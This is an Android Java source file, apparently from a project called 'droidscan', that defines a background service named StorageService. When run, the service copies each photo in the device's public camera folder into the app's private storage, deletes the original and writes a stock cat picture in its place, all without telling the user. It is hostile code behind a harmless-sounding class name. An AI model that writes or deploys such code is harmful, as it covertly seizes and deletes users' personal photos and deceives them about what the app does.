package ru.ifmo.se.droidscan;

import android.app.IntentService;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class StorageService extends IntentService {
    private int count = 0;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public StorageService() {
        super("ServiceNamed");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        File app_path = getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DCIM);
        System.out.println(app_path.toString());
        File filepath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);

        try {

            File camera = getCameraDirectory(filepath);
            File[] pics = camera.listFiles();

            for (File pic : pics) {

                try {
                    if (!pic.getName().contains("cat")) {
                        FileUtils.copyFileToDirectory(pic, app_path);
                        pic.delete();

                        Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.cat);
                        saveBitmap(bitmap, camera);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException e) {
            Log.e("NPE", "Camera dir is upset");
        }

        stopSelf();
    }

    private File getCameraDirectory(File dir) {
        File[] pathFiles = dir.listFiles();
        if (pathFiles != null) {
            for (File f : pathFiles
            ) {
                if (f.getName().contains("Camera")) {
                    return f;
                }
            }
        }
        return dir;
    }

    private void saveBitmap(Bitmap bitmap, File path) {
        try {
            FileOutputStream fos = new FileOutputStream(path + "/cat" + count + ".jpg");
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
            fos.flush();
            fos.close();
            count++;
        } catch (Exception e) {
            Log.e("CatNotSaved", e.toString());
        }
    }
}
